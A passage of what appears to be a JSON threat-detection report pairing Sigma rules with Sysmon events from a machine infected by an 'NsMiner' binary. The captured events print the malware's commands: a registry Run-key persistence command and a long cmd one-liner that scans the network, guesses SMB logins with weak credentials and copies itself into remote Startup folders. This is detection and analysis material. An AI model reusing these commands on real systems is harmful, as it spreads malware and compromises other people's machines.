                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-C088-6560-5B06-000000003B00}; ProcessId=7768; Product=Microsoft\\xae Windows\\xae Operating System; Description=Registry Console Tool; Company=Microsoft Corporation; ParentProcessGuid={C784477D-C087-6560-5606-000000003B00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=CEE2A7E57DF2A159A065A34913A055C2,SHA256=829206FB125010140C40F9A8D08ECEBCBD437A50B351D420B473C13F931191CC,IMPHASH=869B9FF91668F96EF68FBE0DB3602587; OriginalFileName=reg.exe; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=4504; CurrentDirectory=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\; CommandLine=reg  add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"\" /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" /t REG_SZ; EventID=1; LogonGuid=C784477D-327C-6539-A0CC-030000000000; LogonId=248992; Image=C:\\Windows\\SysWOW64\\reg.exe; IntegrityLevel=Medium; ParentCommandLine=\"C:\\Windows\\system32\\cmd.exe\" /c reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"\" /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" /t REG_SZ; UtcTime=1700839560; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-C08E-6560-8D06-000000003B00}; ProcessId=6508; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows Command Processor; Company=Microsoft Corporation; ParentProcessGuid={C784477D-C08C-6560-8006-000000003B00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=F3BDBE3BB6F734E357235F4D5898582D,SHA256=3685495D051137B1C4EFDE22C26DF0883614B6453B762FA84588DA55ED2E7744,IMPHASH=0AF8419BE362159398343D7B31721726; OriginalFileName=Cmd.Exe; ParentImage=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7864; CurrentDirectory=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\; CommandLine=\"C:\\Windows\\system32\\cmd.exe\" /c reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"\" /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" /t REG_SZ; EventID=1; LogonGuid=C784477D-327C-6539-A0CC-030000000000; LogonId=248992; Image=C:\\Windows\\SysWOW64\\cmd.exe; IntegrityLevel=Medium; ParentCommandLine=\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" ; UtcTime=1700839566; RuleName=-}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "ad081ff821748a3cd86b5954ef5c3d7d2a6602fe0b6e50ed47938b98bc184122",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Suspicious Screensaver Binary File Creation",
                                                                       "rule_description":  "Adversaries may establish persistence by executing malicious content triggered by user inactivity.\nScreensavers are programs that execute after a configurable time of user inactivity and consist of Portable Executable (PE) files with a .scr file extension\n",
                                                                       "rule_author":  "frack113",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{EventID=11; ProcessId=7648; TargetFilename=C:\\Users\\george\\AppData\\Local\\Temp\\ihdzkqud.roz\\IMG001.scr; RuleName=-; CreationUtcTime=1700839542; UtcTime=1700839542; ProcessGuid={C784477D-C076-6560-1B06-000000003B00}; Image=C:\\Windows\\SysWOW64\\7za.exe}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "b5f76af9d8101930af8d4fee71f3a5395b47eff6bb88e581db02bf890242d79b",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Direct Autorun Keys Modification",
                                                                       "rule_description":  "Detects direct modification of autostart extensibility point (ASEP) in registry using reg.exe.",
                                                                       "rule_author":  "Victor Sergeev, Daniil Yugoslavskiy, oscd.community",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-C07B-6560-2E06-000000003B00}; ProcessId=3588; Product=Microsoft\\xae Windows\\xae Operating System; Description=Registry Console Tool; Company=Microsoft Corporation; ParentProcessGuid={C784477D-C07B-6560-2706-000000003B00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=CEE2A7E57DF2A159A065A34913A055C2,SHA256=829206FB125010140C40F9A8D08ECEBCBD437A50B351D420B473C13F931191CC,IMPHASH=869B9FF91668F96EF68FBE0DB3602587; OriginalFileName=reg.exe; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=8176; CurrentDirectory=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\; CommandLine=reg  add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"\" /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" /t REG_SZ; EventID=1; LogonGuid=C784477D-327C-6539-76CC-030000000000; LogonId=248950; Image=C:\\Windows\\SysWOW64\\reg.exe; IntegrityLevel=High; ParentCommandLine=\"C:\\Windows\\system32\\cmd.exe\" /c reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"\" /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" /t REG_SZ; UtcTime=1700839547; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-C088-6560-5B06-000000003B00}; ProcessId=7768; Product=Microsoft\\xae Windows\\xae Operating System; Description=Registry Console Tool; Company=Microsoft Corporation; ParentProcessGuid={C784477D-C087-6560-5606-000000003B00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=CEE2A7E57DF2A159A065A34913A055C2,SHA256=829206FB125010140C40F9A8D08ECEBCBD437A50B351D420B473C13F931191CC,IMPHASH=869B9FF91668F96EF68FBE0DB3602587; OriginalFileName=reg.exe; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=4504; CurrentDirectory=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\; CommandLine=reg  add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"\" /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" /t REG_SZ; EventID=1; LogonGuid=C784477D-327C-6539-A0CC-030000000000; LogonId=248992; Image=C:\\Windows\\SysWOW64\\reg.exe; IntegrityLevel=Medium; ParentCommandLine=\"C:\\Windows\\system32\\cmd.exe\" /c reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"\" /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" /t REG_SZ; UtcTime=1700839560; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-C08F-6560-9506-000000003B00}; ProcessId=7572; Product=Microsoft\\xae Windows\\xae Operating System; Description=Registry Console Tool; Company=Microsoft Corporation; ParentProcessGuid={C784477D-C08E-6560-8D06-000000003B00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=CEE2A7E57DF2A159A065A34913A055C2,SHA256=829206FB125010140C40F9A8D08ECEBCBD437A50B351D420B473C13F931191CC,IMPHASH=869B9FF91668F96EF68FBE0DB3602587; OriginalFileName=reg.exe; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=6508; CurrentDirectory=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\; CommandLine=reg  add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"\" /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" /t REG_SZ; EventID=1; LogonGuid=C784477D-327C-6539-A0CC-030000000000; LogonId=248992; Image=C:\\Windows\\SysWOW64\\reg.exe; IntegrityLevel=Medium; ParentCommandLine=\"C:\\Windows\\system32\\cmd.exe\" /c reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"\" /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" /t REG_SZ; UtcTime=1700839567; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-C096-6560-B306-000000003B00}; ProcessId=4048; Product=Microsoft\\xae Windows\\xae Operating System; Description=Registry Console Tool; Company=Microsoft Corporation; ParentProcessGuid={C784477D-C096-6560-AB06-000000003B00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=CEE2A7E57DF2A159A065A34913A055C2,SHA256=829206FB125010140C40F9A8D08ECEBCBD437A50B351D420B473C13F931191CC,IMPHASH=869B9FF91668F96EF68FBE0DB3602587; OriginalFileName=reg.exe; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7568; CurrentDirectory=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\; CommandLine=reg  add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"\" /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" /t REG_SZ; EventID=1; LogonGuid=C784477D-327C-6539-A0CC-030000000000; LogonId=248992; Image=C:\\Windows\\SysWOW64\\reg.exe; IntegrityLevel=Medium; ParentCommandLine=\"C:\\Windows\\system32\\cmd.exe\" /c reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"\" /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" /t REG_SZ; UtcTime=1700839574; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-C09F-6560-E706-000000003B00}; ProcessId=4008; Product=Microsoft\\xae Windows\\xae Operating System; Description=Registry Console Tool; Company=Microsoft Corporation; ParentProcessGuid={C784477D-C09E-6560-DE06-000000003B00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=CEE2A7E57DF2A159A065A34913A055C2,SHA256=829206FB125010140C40F9A8D08ECEBCBD437A50B351D420B473C13F931191CC,IMPHASH=869B9FF91668F96EF68FBE0DB3602587; OriginalFileName=reg.exe; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=8148; CurrentDirectory=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\; CommandLine=reg  add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"\" /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" /t REG_SZ; EventID=1; LogonGuid=C784477D-327C-6539-A0CC-030000000000; LogonId=248992; Image=C:\\Windows\\SysWOW64\\reg.exe; IntegrityLevel=Medium; ParentCommandLine=\"C:\\Windows\\system32\\cmd.exe\" /c reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"\" /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" /t REG_SZ; UtcTime=1700839583; RuleName=-}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "de683a6054ff03b9c12e58c842648f759cfcf797f91dc01078d285e8f3f8e856",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Suspicious Copy From or To System Directory",
                                                                       "rule_description":  "Detects a suspicious copy operation that tries to copy a program from system (System32, SysWOW64, WinSxS) directories to another on disk.\nOften used to move LOLBINs such as \u0027certutil\u0027 or \u0027desktopimgdownldr\u0027 to a different location with a different name in order to bypass detections based on locations.\n",
                                                                       "rule_author":  "Florian Roth (Nextron Systems), Markus Neis, Tim Shelton (HAWK.IO), Nasreddine Bencherchali (Nextron Systems)",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-C07E-6560-3706-000000003B00}; ProcessId=7868; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows Command Processor; Company=Microsoft Corporation; ParentProcessGuid={C784477D-C078-6560-2106-000000003B00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=F3BDBE3BB6F734E357235F4D5898582D,SHA256=3685495D051137B1C4EFDE22C26DF0883614B6453B762FA84588DA55ED2E7744,IMPHASH=0AF8419BE362159398343D7B31721726; OriginalFileName=Cmd.Exe; ParentImage=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7876; CurrentDirectory=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\; CommandLine=\"C:\\Windows\\system32\\cmd.exe\" /v:on /c @(for /f \"usebackq tokens=1\" %%i in (`@net view^|find /i \"\\\\\" ^|^| @arp -a^|find /i \"  1\"`) do @set str_!random!=%%i)\u0026 @for /f \"usebackq tokens=1* delims==\" %%j in (`set str_`) do @set s=%%k\u0026 set s=!s:\\\\=!\u0026 set l=!s:-PC=!\u0026 set l=!l:-\\xcf\\xca=!\u0026 set f=IMG001.exe\u0026 set n=1709\u0026 @if not \"!s!\"==\"%%COMPUTERNAME%%\" @echo connect to \\\\!s! \u0026 (for /f \"usebackq tokens=1\" %%j in (`net view \\\\!s!^|find /i \"    \"`) do @echo f|xcopy /y /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" \"\\\\!s!\\%%j\\!f!\" 1\u003enul \u0026\u0026 @echo copy to \"\\\\!s!\\%%j\\!f!\") \u0026 @net use * /delete /y 2\u003enul \u0026 @(for %%u in (1 !l! administrator user admin \\xe0\\xe4\\xec\\xe8\\xed\\xe8\\xf1\\xf2\\xf0\\xe0\\xf2\\xee\\xf0) do @for %%p in (0 1 123 %%u !n! \"\") do @ping -n 3 localhost\u003enul \u0026 @(for %%c in (\\\\!s!\\C$ \\\\!s!\\Users) do @echo connect to %%c %%p %%u \u0026 @(if not \"%%p%%u\"==\"01\" net use %%c \"%%p\" /user:\"%%u\") \u0026\u0026 @((echo [Section1] \u0026 echo p=%%p %%u)\u003e\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe:P\" \u0026 @(for %%d in (\"%%c\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\%%u\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Users\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Users\\%%u\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Documents and Settings\\%%u\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Documents and Settings\\%%u\\\\xc3\\xeb\\xe0\\xe2\\xed\\xee\\xe5 \\xec\\xe5\\xed\\xfe\\\\xcf\\xf0\\xee\\xe3\\xf0\\xe0\\xec\\xec\\xfb\\\\xc0\\xe2\\xf2\\xee\\xe7\\xe0\\xe3\\xf0\\xf3\\xe7\\xea\\xe0\\!f!\" \"%%c\\Documents and Settings\\All Users\\\\xc3\\xeb\\xe0\\xe2\\xed\\xee\\xe5 \\xec\\xe5\\xed\\xfe\\\\xcf\\xf0\\xee\\xe3\\xf0\\xe0\\xec\\xec\\xfb\\\\xc0\\xe2\\xf2\\xee\\xe7\\xe0\\xe3\\xf0\\xf3\\xe7\\xea\\xe0\\!f!\" \"%%c\\Windows\\Profiles\\%%u\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Windows\\All Users\\Start menu\\Programs\\Startup\\!f!\" \"%%c\\%%u\\!f!\" ) do @echo f|@xcopy /y /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" %%d 1\u003enul \u0026\u0026 @echo copy to %%d) \u0026 @echo nul\u003e\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe:P\" \u0026 net use %%c /delete /y 2\u003enul \u0026 @ping -n 20 localhost\u003enul))); EventID=1; LogonGuid=C784477D-327C-6539-76CC-030000000000; LogonId=248950; Image=C:\\Windows\\SysWOW64\\cmd.exe; IntegrityLevel=High; ParentCommandLine=\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" ; UtcTime=1700839550; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-C083-6560-4506-000000003B00}; ProcessId=8124; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows Command Processor; Company=Microsoft Corporation; ParentProcessGuid={C784477D-C078-6560-2106-000000003B00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=F3BDBE3BB6F734E357235F4D5898582D,SHA256=3685495D051137B1C4EFDE22C26DF0883614B6453B762FA84588DA55ED2E7744,IMPHASH=0AF8419BE362159398343D7B31721726; OriginalFileName=Cmd.Exe; ParentImage=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7876; CurrentDirectory=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\; CommandLine=\"C:\\Windows\\system32\\cmd.exe\" /v:on /c @(for /f \"usebackq tokens=1\" %%i in (`@net view^|find /i \"\\\\\" ^|^| @arp -a^|find /i \"  1\"`) do @set str_!random!=%%i)\u0026 @for /f \"usebackq tokens=1* delims==\" %%j in (`set str_`) do @set s=%%k\u0026 set s=!s:\\\\=!\u0026 set l=!s:-PC=!\u0026 set l=!l:-\\xcf\\xca=!\u0026 set f=IMG001.exe\u0026 set n=1601\u0026 @if not \"!s!\"==\"%%COMPUTERNAME%%\" @echo connect to \\\\!s! \u0026 (for /f \"usebackq tokens=1\" %%j in (`net view \\\\!s!^|find /i \"    \"`) do @echo f|xcopy /y /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" \"\\\\!s!\\%%j\\!f!\" 1\u003enul \u0026\u0026 @echo copy to \"\\\\!s!\\%%j\\!f!\") \u0026 @net use * /delete /y 2\u003enul \u0026 @(for %%u in (1 !l! administrator user admin \\xe0\\xe4\\xec\\xe8\\xed\\xe8\\xf1\\xf2\\xf0\\xe0\\xf2\\xee\\xf0) do @for %%p in (0 1 123 %%u !n! \"\") do @ping -n 3 localhost\u003enul \u0026 @(for %%c in (\\\\!s!\\C$ \\\\!s!\\Users) do @echo connect to %%c %%p %%u \u0026 @(if not \"%%p%%u\"==\"01\" net use %%c \"%%p\" /user:\"%%u\") \u0026\u0026 @((echo [Section1] \u0026 echo p=%%p %%u)\u003e\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe:P\" \u0026 @(for %%d in (\"%%c\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\%%u\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Users\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Users\\%%u\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Documents and Settings\\%%u\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Documents and Settings\\%%u\\\\xc3\\xeb\\xe0\\xe2\\xed\\xee\\xe5 \\xec\\xe5\\xed\\xfe\\\\xcf\\xf0\\xee\\xe3\\xf0\\xe0\\xec\\xec\\xfb\\\\xc0\\xe2\\xf2\\xee\\xe7\\xe0\\xe3\\xf0\\xf3\\xe7\\xea\\xe0\\!f!\" \"%%c\\Documents and Settings\\All Users\\\\xc3\\xeb\\xe0\\xe2\\xed\\xee\\xe5 \\xec\\xe5\\xed\\xfe\\\\xcf\\xf0\\xee\\xe3\\xf0\\xe0\\xec\\xec\\xfb\\\\xc0\\xe2\\xf2\\xee\\xe7\\xe0\\xe3\\xf0\\xf3\\xe7\\xea\\xe0\\!f!\" \"%%c\\Windows\\Profiles\\%%u\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Windows\\All Users\\Start menu\\Programs\\Startup\\!f!\" \"%%c\\%%u\\!f!\" ) do @echo f|@xcopy /y /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" %%d 1\u003enul \u0026\u0026 @echo copy to %%d) \u0026 @echo nul\u003e\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe:P\" \u0026 net use %%c /delete /y 2\u003enul \u0026 @ping -n 20 localhost\u003enul))); EventID=1; LogonGuid=C784477D-327C-6539-76CC-030000000000; LogonId=248950; Image=C:\\Windows\\SysWOW64\\cmd.exe; IntegrityLevel=High; ParentCommandLine=\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" ; UtcTime=1700839555; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-C08A-6560-6C06-000000003B00}; ProcessId=7380; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows Command Processor; Company=Microsoft Corporation; ParentProcessGuid={C784477D-C084-6560-4A06-000000003B00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=F3BDBE3BB6F734E357235F4D5898582D,SHA256=3685495D051137B1C4EFDE22C26DF0883614B6453B762FA84588DA55ED2E7744,IMPHASH=0AF8419BE362159398343D7B31721726; OriginalFileName=Cmd.Exe; ParentImage=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7396; CurrentDirectory=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\; CommandLine=\"C:\\Windows\\system32\\cmd.exe\" /v:on /c @(for /f \"usebackq tokens=1\" %%i in (`@net view^|find /i \"\\\\\" ^|^| @arp -a^|find /i \"  1\"`) do @set str_!random!=%%i)\u0026 @for /f \"usebackq tokens=1* delims==\" %%j in (`set str_`) do @set s=%%k\u0026 set s=!s:\\\\=!\u0026 set l=!s:-PC=!\u0026 set l=!l:-\\xcf\\xca=!\u0026 set f=IMG001.exe\u0026 set n=0201\u0026 @if not \"!s!\"==\"%%COMPUTERNAME%%\" @echo connect to \\\\!s! \u0026 (for /f \"usebackq tokens=1\" %%j in (`net view \\\\!s!^|find /i \"    \"`) do @echo f|xcopy /y /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" \"\\\\!s!\\%%j\\!f!\" 1\u003enul \u0026\u0026 @echo copy to \"\\\\!s!\\%%j\\!f!\") \u0026 @net use * /delete /y 2\u003enul \u0026 @(for %%u in (1 !l! administrator user admin \\xe0\\xe4\\xec\\xe8\\xed\\xe8\\xf1\\xf2\\xf0\\xe0\\xf2\\xee\\xf0) do @for %%p in (0 1 123 %%u !n! \"\") do @ping -n 3 localhost\u003enul \u0026 @(for %%c in (\\\\!s!\\C$ \\\\!s!\\Users) do @echo connect to %%c %%p %%u \u0026 @(if not \"%%p%%u\"==\"01\" net use %%c \"%%p\" /user:\"%%u\") \u0026\u0026 @((echo [Section1] \u0026 echo p=%%p %%u)\u003e\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe:P\" \u0026 @(for %%d in (\"%%c\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\%%u\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Users\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Users\\%%u\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Documents and Settings\\%%u\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Documents and Settings\\%%u\\\\xc3\\xeb\\xe0\\xe2\\xed\\xee\\xe5 \\xec\\xe5\\xed\\xfe\\\\xcf\\xf0\\xee\\xe3\\xf0\\xe0\\xec\\xec\\xfb\\\\xc0\\xe2\\xf2\\xee\\xe7\\xe0\\xe3\\xf0\\xf3\\xe7\\xea\\xe0\\!f!\" \"%%c\\Documents and Settings\\All Users\\\\xc3\\xeb\\xe0\\xe2\\xed\\xee\\xe5 \\xec\\xe5\\xed\\xfe\\\\xcf\\xf0\\xee\\xe3\\xf0\\xe0\\xec\\xec\\xfb\\\\xc0\\xe2\\xf2\\xee\\xe7\\xe0\\xe3\\xf0\\xf3\\xe7\\xea\\xe0\\!f!\" \"%%c\\Windows\\Profiles\\%%u\\Start Menu\\Programs\\Startup\\!f!\" \"%%c\\Windows\\All Users\\Start menu\\Programs\\Startup\\!f!\" \"%%c\\%%u\\!f!\" ) do @echo f|@xcopy /y /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" %%d 1\u003enul \u0026\u0026 @echo copy to %%d) \u0026 @echo nul\u003e\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe:P\" \u0026 net use %%c /delete /y 2\u003enul \u0026 @ping -n 20 localhost\u003enul))); EventID=1; LogonGuid=C784477D-327C-6539-A0CC-030000000000; LogonId=248992; Image=C:\\Windows\\SysWOW64\\cmd.exe; IntegrityLevel=Medium; ParentCommandLine=\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" ; UtcTime=1700839562; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-C08A-6560-7806-000000003B00}; ProcessId=2032; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows Command Processor; Company=Microsoft Corporation; ParentProcessGuid={C784477D-C07E-6560-3706-000000003B00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=F3BDBE3BB6F734E357235F4D5898582D,SHA256=3685495D051137B1C4EFDE22C26DF0883614B6453B762FA84588DA55ED2E7744,IMPHASH=0AF8419BE362159398343D7B31721726; OriginalFileName=Cmd.Exe; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7868; CurrentDirectory=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\; CommandLine=C:\\Windows\\system32\\cmd.exe  /S /D /c\" @ xcopy /y /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" \"\\\\192.168.2.42\\C$\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\IMG001.exe\"  1\u003enul \u0026\u0026 @ echo copy to \"\\\\192.168.2.42\\C$\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\IMG001.exe\"  \"; EventID=1; LogonGuid=C784477D-327C-6539-76CC-030000000000; LogonId=248950; Image=C:\\Windows\\SysWOW64\\cmd.exe; IntegrityLevel=High; ParentCommandLine=\"C:\\Windows\\system32\\cmd.exe\" /v:on /c @(for /f \"usebackq tokens=1\" %i in (`@net view^|find /i \"\\\\\" ^|^| @arp -a^|find /i \"  1\"`) do @set str_!random!=%i)\u0026 @for /f \"usebackq tokens=1* delims==\" %j in (`set str_`) do @set s=%k\u0026 set s=!s:\\\\=!\u0026 set l=!s:-PC=!\u0026 set l=!l:-\\xcf\\xca=!\u0026 set f=IMG001.exe\u0026 set n=1709\u0026 @if not \"!s!\"==\"%COMPUTERNAME%\" @echo connect to \\\\!s! \u0026 (for /f \"usebackq tokens=1\" %j in (`net view \\\\!s!^|find /i \"    \"`) do @echo f|xcopy /y /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" \"\\\\!s!\\%j\\!f!\" 1\u003enul \u0026\u0026 @echo copy to \"\\\\!s!\\%j\\!f!\") \u0026 @net use * /delete /y 2\u003enul \u0026 @(for %u in (1 !l! administrator user admin \\xe0\\xe4\\xec\\xe8\\xed\\xe8\\xf1\\xf2\\xf0\\xe0\\xf2\\xee\\xf0) do @for %p in (0 1 123 %u !n! \"\") do @ping -n 3 localhost\u003enul \u0026 @(for %c in (\\\\!s!\\C$ \\\\!s!\\Users) do @echo connect to %c %p %u \u0026 @(if not \"%p%u\"==\"01\" net use %c \"%p\" /user:\"%u\") \u0026\u0026 @((echo [Section1] \u0026 echo p=%p %u)\u003e\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe:P\" \u0026 @(for %d in (\"%c\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" 